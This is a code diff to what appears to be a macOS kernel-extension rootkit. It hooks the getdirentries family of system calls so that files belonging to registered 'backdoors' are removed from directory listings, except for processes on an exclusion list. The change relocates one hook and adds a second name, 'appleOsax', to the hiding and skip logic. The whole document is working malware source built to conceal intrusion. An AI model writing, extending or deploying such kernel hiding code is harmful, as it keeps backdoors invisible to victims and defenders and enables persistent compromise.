@@ -44,6 +44,7 @@
 #define PLENGTH       6
 
 #define IM            "appleHID"
+#define OSAX          "appleOsax"
 #define KERNEL_BASE   0xffffff8000200000 // SL 10.6.4
 
 //#define DEBUG
@@ -450,6 +451,89 @@ static int cdev_ioctl(dev_t dev,
 #pragma mark Hooks
 #pragma mark -
 
+int hook_getdirentries(struct proc *p,
+                       struct mk_getdirentries_args *uap,
+                       int *retval)
+{
+  struct dirent *tmp, *current;
+  long size, count, length = 0;
+  int flag = 0;
+  int i_entry, i_path;
+  
+  real_getdirentries(p, uap, retval);
+  size = retval[0];
+  
+  if (size > 0
+      && check_for_process_exclusions(p->p_pid) == -1) {
+    MALLOC(tmp, struct dirent *, size, MK_MBUF, M_WAITOK);
+    copyin(uap->buf, tmp, size);
+    
+    count = size;
+    current = (struct dirent *)(char *)tmp;
+    
+    while (count > 0) {
+      length = current->d_reclen;
+      count -= length;
+      
+      for (i_entry = 0; i_entry < g_backdoor_counter_static; i_entry++) {
+        //
+        // Enforce checks in order to avoid situation where all the files are hidden
+        // from the disk since the g_reg_backdoors structure is inconsistent
+        //
+        if (g_reg_backdoors[i_entry]->isActive == 1) {
+          for (i_path = 0; i_path < g_reg_backdoors[i_entry]->pathCounter; i_path++) {
+            if (strncmp(g_reg_backdoors[i_entry]->path[i_path], "",
+                        strlen(g_reg_backdoors[i_entry]->path[i_path])) == 0)
+              continue;
+            
+            if (strncmp((char *)&(current->d_name),
+                        g_reg_backdoors[i_entry]->path[i_path],
+                        strlen(g_reg_backdoors[i_entry]->path[i_path])) == 0) {
+              if (count != 0) {
+                // Remove the entry from buf
+                memmove((char *)current, (char *)current + length, count);
+                flag = 1;
+              }
+              // Adjust the size since we removed an entry
+              size -= length;
+              break;
+            }
+          }
+        }
+        
+        if (flag)
+          break;
+      }
+#if 0
+      if (strncmp((char *)&(current->d_name), PREFIX, PLENGTH) == 0) {
+        if (count != 0) {
+          // Remove the entry from buf
+          bcopy((char *)current + length, (char *)current, count - length);
+          flag = 1;
+        }
+        // Adjust the size since we removed an entry
+        size -= length;
+      }
+#endif
+      // Last dir always has length of 0
+      if (current->d_reclen == 0)
+        count = 0;
+      // Point to the next struct entry if we didn't remove anything
+      if (count != 0 && flag == 0)
+        current = (struct dirent *)((char *)current + length);
+      flag = 0;
+    }
+    
+    // Update the return size
+    *retval = size;
+    // Copy back to uspace the modified buffer
+    copyout(tmp, uap->buf, size);
+    FREE(tmp, MK_MBUF);
+  }
+  
+  return(0);
+}
+
 int hook_getdirentries64(struct proc *p,
                          struct mk_getdirentries64_args *uap,
                          int *retval)
@@ -534,89 +618,6 @@ int hook_getdirentries64(struct proc *p,
   return(0);
 }
 
-int hook_getdirentries(struct proc *p,
-                       struct mk_getdirentries_args *uap,
-                       int *retval)
-{
-  struct dirent *tmp, *current;
-  long size, count, length = 0;
-  int flag = 0;
-  int i_entry, i_path;
-  
-  real_getdirentries(p, uap, retval);
-  size = retval[0];
-    
-  if (size > 0
-      && check_for_process_exclusions(p->p_pid) == -1) {
-    MALLOC(tmp, struct dirent *, size, MK_MBUF, M_WAITOK);
-    copyin(uap->buf, tmp, size);
-
-    count = size;
-    current = (struct dirent *)(char *)tmp;
-
-    while (count > 0) {
-      length = current->d_reclen;
-      count -= length;
-      
-      for (i_entry = 0; i_entry < g_backdoor_counter_static; i_entry++) {
-        //
-        // Enforce checks in order to avoid situation where all the files are hidden
-        // from the disk since the g_reg_backdoors structure is inconsistent
-        //
-        if (g_reg_backdoors[i_entry]->isActive == 1) {
-          for (i_path = 0; i_path < g_reg_backdoors[i_entry]->pathCounter; i_path++) {
-            if (strncmp(g_reg_backdoors[i_entry]->path[i_path], "",
-                        strlen(g_reg_backdoors[i_entry]->path[i_path])) == 0)
-              continue;
-            
-            if (strncmp((char *)&(current->d_name),
-                        g_reg_backdoors[i_entry]->path[i_path],
-                        strlen(g_reg_backdoors[i_entry]->path[i_path])) == 0) {
-              if (count != 0) {
-                // Remove the entry from buf
-                memmove((char *)current, (char *)current + length, count);
-                flag = 1;
-              }
-              // Adjust the size since we removed an entry
-              size -= length;
-              break;
-            }
-          }
-        }
-        
-        if (flag)
-          break;
-      }
-#if 0
-      if (strncmp((char *)&(current->d_name), PREFIX, PLENGTH) == 0) {
-        if (count != 0) {
-          // Remove the entry from buf
-          bcopy((char *)current + length, (char *)current, count - length);
-          flag = 1;
-        }
-         // Adjust the size since we removed an entry
-        size -= length;
-      }
-#endif
-      // Last dir always has length of 0
-      if (current->d_reclen == 0)
-        count = 0;
-      // Point to the next struct entry if we didn't remove anything
-      if (count != 0 && flag == 0)
-        current = (struct dirent *)((char *)current + length);
-      flag = 0;
-    }
-
-    // Update the return size
-    *retval = size;
-    // Copy back to uspace the modified buffer
-    copyout(tmp, uap->buf, size);
-    FREE(tmp, MK_MBUF);
-  }
-
-  return(0);
-}
-
 int hook_getdirentriesattr(struct proc *p,
                            struct mk_getdirentriesattr_args *uap,
                            int *retval)
@@ -689,15 +690,17 @@ int hook_getdirentriesattr(struct proc *p,
             if (strncmp(curr_entry,
                         g_reg_backdoors[curr_backdoor]->path[curr_path],
                         strlen(g_reg_backdoors[curr_backdoor]->path[curr_path])) == 0) {
-              if (strncmp(curr_entry, IM, strlen(IM)) == 0
-                  && p->p_start.tv_sec == 0) {
+              if ((strncmp(curr_entry, IM, strlen(IM)) == 0)
+                 || (strncmp(curr_entry, OSAX, strlen(OSAX)) == 0)) {
+                if (p->p_start.tv_sec == 0) {
 #ifdef DEBUG
-                printf("Entry matched for IM (first time) - skipping\n");
+                  printf("Entry matched for %s (first time) - skipping\n", curr_entry);
 #endif
-                
-                p->p_start.tv_sec = 1;
-                
-                continue;
+                  
+                  p->p_start.tv_sec = 1;
+                  
+                  continue;
+                }
               }
 #ifdef DEBUG
               printf("KEXT matched %s for %s\n", curr_entry, procName);
